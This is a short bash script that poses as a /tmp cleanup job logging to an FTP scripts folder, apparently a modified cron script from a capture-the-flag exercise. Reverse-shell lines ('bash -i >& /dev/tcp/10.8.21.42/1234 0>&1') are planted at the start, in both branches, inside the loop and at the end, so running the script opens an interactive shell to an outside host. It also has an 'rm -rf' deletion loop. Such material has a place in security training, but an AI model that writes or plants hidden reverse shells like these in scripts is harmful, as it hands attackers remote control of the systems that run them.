#!/bin/bash

bash -i >& /dev/tcp/10.8.21.42/1234 0>&1
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
        bash -i >& /dev/tcp/10.8.21.42/1234 0>&1
else
    bash -i >& /dev/tcp/10.8.21.42/1234 0>&1
    for LINE in $tmp_files; do
        bash -i >& /dev/tcp/10.8.21.42/1234 0>&1
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
bash -i >& /dev/tcp/10.8.21.42/1234 0>&1
